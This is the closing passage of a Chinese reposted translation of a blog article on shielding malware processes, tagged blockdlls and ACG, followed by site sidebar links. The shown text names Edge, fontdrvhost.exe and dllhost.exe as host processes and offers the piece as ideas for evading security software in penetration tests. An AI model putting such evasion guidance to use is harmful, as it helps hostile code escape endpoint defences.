class=pgc-img-caption></p></div><p>這些進程主要圍繞Edge。當然我們也有許多其他選擇，例如fontdrvhost.exe和dllhost.exe。</p><p>希望這篇文章能給你在滲透測試期間躲避安全軟件的檢測提供一些思路。</p><p>本文由白帽彙整理並翻譯，不代表白帽匯任何觀點和立場</p><p>來源：https://nosec.org/home/detail/3131.html</p><p>原文：https://blog.xpnsec.com/protecting-your-malware/</p><p>白帽匯從事信息安全，專注於安全大數據、企業威脅情報。</p><p>公司產品：FOFA-網絡空間安全搜索引擎、FOEYE-網絡空間檢索系統、NOSEC-安全訊息平臺。</p><p>為您提供：網絡空間測繪、企業資產收集、企業威脅情報、應急響應服務。</p></div></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>blockdlls</a></li><li><a>ACG</a></li><li><a>保護</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/4f3d4ceb.html alt="黃河流域保護 | 周晉峰：採砂問題事關生物多樣性與食品安全" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/c875f033313740458476cd1ee9d05bce style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/4f3d4ceb.html title="黃河流域保護 | 周晉峰：採砂問題事關生物多樣性與食品安全">黃河流域保護 | 周晉峰：採砂問題事關生物多樣性與食品安全</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/930693d7.html alt=保護太空電子設備的材料如何減輕重量？新技術：添加生鏽粉末 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/7edb0c835071408a85277eec5651718a style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/930693d7.html title=保護太空電子設備的材料如何減輕重量？新技術：添加生鏽粉末>保護太空電子設備的材料如何減輕重量？新技術：添加生鏽粉末</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/43435e3f.html alt=電工常用溫度保護元器件大觀 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/ea35f6a9d06e42a1840b6ba12d553612 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/43435e3f.html title=電工常用溫度保護元器件大觀>電工常用溫度保護元器件大觀</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/55e85624.html alt="18個自我保護技巧 讓危險遠離你" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/56bb2bf4051a46b89e155cd69f54ab76 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/55e85624.html title="18個自我保護技巧 讓危險遠離你">18個自我保護技巧 讓危險遠離你</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/02bddf38.html alt=6個自我保護小問答，孩子上小學前要教會他，建議收藏 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/4770b3fdfb2b4b77ada068011323a976 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/02bddf38.html title=6個自我保護小問答，孩子上小學前要教會他，建議收藏>6個自我保護小問答，孩子上小學前要教會他，建議收藏</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/243074c4.html alt=“自我保護意識”對孩子很重要，父母抓住3點培養，早知早受益 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/3af07d4b59454f4983759a5662ce5522 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/243074c4.html title=“自我保護意識”對孩子很重要，父母抓住3點培養，早知早受益>“自我保護意識”對孩子很重要，父母抓住3點培養，早知早受益</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8a1c031e.html alt=人性漫畫：請你懂得自我保護 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/6fa677270c614030982cc0eb9596ed7c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8a1c031e.html title=人性漫畫：請你懂得自我保護>人性漫畫：請你懂得自我保護</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/56b76b13.html alt=人自我保護有哪些心理？這15種行為說明你在自我保護 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/5083ffb0686a4b459365b08757c98740 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/56b76b13.html title=人自我保護有哪些心理？這15種行為說明你在自我保護>人自我保護有哪些心理？這15種行為說明你在自我保護</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/69f3f60a.html alt=今日話題丨疫情襲來，如何自我保護，做一個負責任的公民？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/RoXDJ4BCatGFSF style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/69f3f60a.html title=今日話題丨疫情襲來，如何自我保護，做一個負責任的公民？>今日話題丨疫情襲來，如何自我保護，做一個負責任的公民？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/bc6a7447.html alt=做人，要懂得自我保護 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/66b70002373208920316 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/bc6a7447.html title=做人，要懂得自我保護>做人，要懂得自我保護</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/2e0bd407.html alt=千里之外，如何做好自我保護？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/RmMGFKaEGZ7hz0 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/2e0bd407.html title=千里之外，如何做好自我保護？>千里之外，如何做好自我保護？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/1803c987.html alt=培養自我保護能力一教孩子守衛自己的生命 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/8123c1a8d76d4f9bb110d37e30de5f58 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/1803c987.html title=培養自我保護能力一教孩子守衛自己的生命>培養自我保護能力一教孩子守衛自己的生命</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b6d12ce0.html alt=如何從善良走向勇敢：學會自我保護 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/dfic-imagehandler/2533e60b-43cf-4f3b-b228-9f35f15c83b0 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b6d12ce0.html title=如何從善良走向勇敢：學會自我保護>如何從善良走向勇敢：學會自我保護</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/eb6286c5.html alt=如何提高自我保護能力？這8條法則，值得每個父母和孩子看看 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/153149234557338aa044f5c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/eb6286c5.html title=如何提高自我保護能力？這8條法則，值得每個父母和孩子看看>如何提高自我保護能力？這8條法則，值得每個父母和孩子看看</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/58704c1a.html alt=如何讓孩子學會自我保護？家長做好這幾點，不在他身邊也能放心 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/RKMrG1R3MogCdH style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/58704c1a.html title=如何讓孩子學會自我保護？家長做好這幾點，不在他身邊也能放心>如何讓孩子學會自我保護？家長做好這幾點，不在他身邊也能放心</a></li><hr></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>